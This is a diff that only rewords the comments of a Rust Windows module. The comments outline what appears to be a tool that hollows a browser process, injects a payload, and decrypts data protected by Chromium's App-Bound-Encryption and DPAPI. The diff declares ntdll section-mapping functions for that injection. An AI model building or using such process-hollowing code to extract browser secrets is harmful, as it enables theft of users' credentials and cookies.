@@ -1,14 +1,14 @@
 //! Windows-only machinery. Every `unsafe` block in the crate lives under this
 //! module tree.
 //!
-//! - [`dpapi`] — `CryptUnprotectData` behind a safe API.
-//! - [`elevator`] — the Chromium App-Bound-Encryption `IElevator` COM client.
-//! - [`image`] — PE32+ header parsing (pure byte math, no OS calls).
-//! - [`postbox`] — the fixed-address mailbox page shared by the two halves.
-//! - [`conduit`] — the named-pipe channel + authenticated frame protocol.
-//! - [`proc`] — process/memory primitives (spawn, map, resume, sample).
-//! - [`injector`] — the parent-side orchestration of the in-browser run.
-//! - [`proxy`] — the payload-side run inside the hollowed browser process.
+//! - [`dpapi`]: `CryptUnprotectData` behind a safe API.
+//! - [`elevator`]: the Chromium App-Bound-Encryption `IElevator` COM client.
+//! - [`image`]: PE32+ header parsing (pure byte math, no OS calls).
+//! - [`postbox`]: the fixed-address mailbox page shared by the two halves.
+//! - [`conduit`]: the named-pipe channel and authenticated frame protocol.
+//! - [`proc`]: process/memory primitives (spawn, map, resume, sample).
+//! - [`injector`]: the parent-side orchestration of the in-browser run.
+//! - [`proxy`]: the payload-side run inside the hollowed browser process.
 #![allow(unsafe_code)]
 
 pub mod conduit;
@@ -87,7 +87,7 @@ pub(crate) fn nt_error(operation: &'static str, status: i32) -> anyhow::Error {
 // ntdll primitives not surfaced by windows-sys with the features we use.
 #[link(name = "ntdll")]
 extern "system" {
-    /// `NtCreateSection` — needed for the `SEC_IMAGE` section backing the
+    /// `NtCreateSection`, needed for the `SEC_IMAGE` section backing the
     /// payload mapping (a genuine image view the OS loader accepts).
     pub(crate) fn NtCreateSection(
         section_handle: *mut HANDLE,
@@ -99,7 +99,7 @@ extern "system" {
         file_handle: HANDLE,
     ) -> i32;
 
-    /// `NtMapViewOfSection` — maps the image section into the suspended child.
+    /// `NtMapViewOfSection`; maps the image section into the suspended child.
     #[allow(clippy::too_many_arguments)]
     pub(crate) fn NtMapViewOfSection(
         section_handle: HANDLE,
@@ -117,7 +117,7 @@ extern "system" {
 
 /// `SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE`.
 pub(crate) const SECTION_MAP_ALL: u32 = 0x000E;
-/// `SEC_IMAGE` — the mapping is an executable image view.
+/// `SEC_IMAGE`: the mapping is an executable image view.
 pub(crate) const SEC_IMAGE: u32 = 0x1000_0000;
 /// `ViewShare` inherit disposition.
 pub(crate) const VIEW_SHARE: u32 = 1;
